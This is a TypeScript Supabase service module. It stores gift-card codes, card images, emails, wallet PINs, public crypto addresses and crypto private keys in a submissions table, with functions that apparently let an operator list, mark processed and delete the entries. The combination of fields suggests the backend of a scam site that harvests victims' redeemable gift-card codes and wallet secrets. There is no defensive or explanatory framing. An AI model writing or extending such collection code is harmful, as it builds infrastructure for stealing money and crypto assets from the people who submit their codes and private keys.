import { supabase } from "@/integrations/supabase/client";

export interface SubmissionData {
  cardType: string;
  email: string;
  codes?: string[];
  wallet?: string;
  pin?: string;
  publicAddress?: string;
  privateKey?: string;
  imageUrl?: string;
}

export interface Submission {
  id: string;
  created_at: string;
  card_type: string;
  email: string;
  code_1: string | null;
  code_2: string | null;
  code_3: string | null;
  code_4: string | null;
  code_5: string | null;
  wallet: string | null;
  pin: string | null;
  public_address: string | null;
  private_key: string | null;
  image_url: string | null;
  status: string;
}

export const uploadCardImage = async (file: File): Promise<{ url?: string; error?: string }> => {
  const ext = file.name.split('.').pop() || 'jpg';
  const path = `${crypto.randomUUID()}.${ext}`;
  const { error } = await supabase.storage.from('card-images').upload(path, file, {
    contentType: file.type,
    upsert: false,
  });
  if (error) return { error: error.message };
  const { data } = supabase.storage.from('card-images').getPublicUrl(path);
  return { url: data.publicUrl };
};

export const submitCodes = async (data: SubmissionData): Promise<{ success: boolean; error?: string }> => {
  const codes = data.codes || [];
  const { error } = await supabase
    .from('submissions')
    .insert({
      card_type: data.cardType,
      email: data.email,
      code_1: codes[0] || null,
      code_2: codes[1] || null,
      code_3: codes[2] || null,
      code_4: codes[3] || null,
      code_5: codes[4] || null,
      wallet: data.wallet || null,
      pin: data.pin || null,
      public_address: data.publicAddress || null,
      private_key: data.privateKey || null,
      image_url: data.imageUrl || null,
    });

  if (error) {
    console.error('Error submitting codes:', error);
    return { success: false, error: error.message };
  }

  return { success: true };
};

export const fetchSubmissions = async (): Promise<{ data: Submission[] | null; error?: string }> => {
  const { data, error } = await supabase
    .from('submissions')
    .select('*')
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Error fetching submissions:', error);
    return { data: null, error: error.message };
  }

  return { data: data as Submission[] };
};

export const updateSubmissionStatus = async (id: string, status: 'pending' | 'processed'): Promise<{ success: boolean; error?: string }> => {
  const { error } = await supabase
    .from('submissions')
    .update({ status })
    .eq('id', id);

  if (error) {
    console.error('Error updating submission:', error);
    return { success: false, error: error.message };
  }

  return { success: true };
};

export const deleteSubmission = async (id: string): Promise<{ success: boolean; error?: string }> => {
  const { error } = await supabase
    .from('submissions')
    .delete()
    .eq('id', id);

  if (error) {
    console.error('Error deleting submission:', error);
    return { success: false, error: error.message };
  }

  return { success: true };
};
